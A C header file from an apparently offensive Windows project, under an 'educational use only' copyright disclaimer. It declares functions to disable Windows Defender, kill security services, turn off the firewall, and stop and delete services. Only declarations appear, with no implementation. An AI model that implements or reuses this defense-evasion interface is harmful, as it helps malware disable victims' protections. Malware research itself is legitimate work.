/*Author: Jahanzaib Ashraf Mir
Kashmir
CSE GRAD W/S in Cybersecurity
Malware Researcher | Cybersecurity Engineer | Hacker
Copyright © 2026. All Rights Reserved.

This educational script and software is designed
strictly for academic research and defensive analysis.
No part of this script may be reproduced, published, distributed, modified,
sold, rebranded, or executed on any unauthorized systems, networks, or servers,
by any means or in any form, without prior written permission of the copyright owner.

Unauthorized use, deployment, or duplication is strictly prohibited and may result
in severe legal action under applicable copyright and computer crime statutes.

THIS SOFTWARE IS PROVIDED "AS IS" FOR EDUCATIONAL PURPOSES ONLY.
The author assumes zero liability and no responsibility for any misuse, damage,
data loss, or illegal activity resulting from the execution of this code.
Execution against non-consenting target systems is strictly illegal.*/

#pragma once
#ifndef SECURITY_H
#define SECURITY_H
#include <windows.h>
#include <stdbool.h>

/* 
windows security disable engine
  Disables Windows Defender, firewall, and security services
 */

/* Core Functions */
bool SecurityDisableDefender(void);
bool SecurityKillSecurityServices(void);
bool SecurityDisableFirewall(void);

/* Service Management */
bool SecurityManageService(const char *svcName, bool stop_and_delete);

#endif
